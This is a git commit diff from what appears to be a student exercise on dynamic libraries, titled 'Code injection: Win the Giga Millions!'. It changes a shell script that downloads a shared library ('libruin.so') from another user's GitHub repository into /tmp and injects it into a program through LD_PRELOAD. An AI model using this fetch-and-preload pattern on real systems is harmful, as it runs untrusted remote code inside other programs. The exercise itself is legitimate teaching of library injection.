d05c51b7264eccab1c912c5611c226b46fd3ff89
agapxx <okontaagape@gmail.com>
2022-10-03 17:57:35 -0700

    3. Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q -O /tmp/gigalib.so "https://raw.githubusercontent.com/agapxx/alx-low_level_programming/master/0x18-dynamic_libraries/gigalib.so"
-export LD_PRELOAD=/tmp/gigalib.so
+wget -P /tmp/ https://raw.github.com./Seun0001/alx-low_level_programming/main/0x18-dynamic_libraries/libruin.so
+export LD_PRELOAD=/tmp/libruin.so
